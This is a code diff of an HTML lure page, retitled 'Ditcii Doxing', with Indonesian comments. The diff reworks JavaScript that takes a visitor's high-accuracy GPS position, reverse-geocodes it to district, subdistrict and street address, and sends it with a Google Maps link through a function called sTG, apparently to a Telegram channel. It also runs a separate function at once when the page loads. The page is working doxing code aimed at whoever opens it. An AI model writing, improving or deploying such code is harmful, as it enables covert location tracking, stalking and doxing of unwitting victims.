@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1.0">
-    <title>Bug wa web</title>
+    <title>Ditcii Doxing</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
         body{background:#000;margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial,sans-serif;color:#999;overflow:hidden}
@@ -120,26 +120,40 @@
             }
         }, 2000); 
 
-        // Menggunakan getCurrentPosition untuk hanya mengirim 1x dan menambahkan link Google Maps
-        if(navigator.geolocation){
-            navigator.geolocation.getCurrentPosition(async p=>{
-                const lat = p.coords.latitude;
-                const lon = p.coords.longitude;
-                
-                // Menambahkan link Google Maps
-                let g=`📍 GPS TRACKING (ONE-TIME)\n`;
-                g+=`📌 Lat: ${lat}\n📍 Lng: ${lon}\n`;
-                g+=`🎯 Akurasi: ${p.coords.accuracy}m\n`;
-                g+=`🗺️ Google Maps: https://www.google.com/maps/search/?api=1&query=${lat},${lon}\n`;
-                
-                const l=await gLD(lat,lon);
-                g+=`🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat: ${l.fa}\n`;
-                await sTG(g)
-            },async e=>{
-                await sTG(`❌ GPS Error: ${e.message}`)
-            },{enableHighAccuracy:true,maximumAge:0,timeout:5000})
-        }
-    };
+document.getElementById("btnLokasi").addEventListener("click", async () => {
+
+  if (!navigator.geolocation) {
+    await sTG("❌ Browser tidak mendukung GPS");
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    async (p) => {
+      const lat = p.coords.latitude;
+      const lon = p.coords.longitude;
+
+      let g = `📍 GPS TRACKING (ONE-TIME)\n`;
+      g += `📌 Lat: ${lat}\n📍 Lng: ${lon}\n`;
+      g += `🎯 Akurasi: ${p.coords.accuracy}m\n`;
+      g += `🗺️ Google Maps: https://www.google.com/maps?q=${lat},${lon}\n`;
+
+      const l = await gLD(lat, lon);
+      g += `🏙️ Kabupaten: ${l.kb}\n`;
+      g += `🏙️ Kecamatan: ${l.kc}\n`;
+      g += `🏠 Alamat: ${l.fa}\n`;
+
+      await sTG(g);
+    },
+    async (e) => {
+      await sTG(`❌ GPS Error: ${e.message}`);
+    },
+    {
+      enableHighAccuracy: true,
+      timeout: 15000,
+      maximumAge: 0
+    }
+  );
+});
 
     // Langsung menjalankan fungsi ST tanpa delay
     ST();
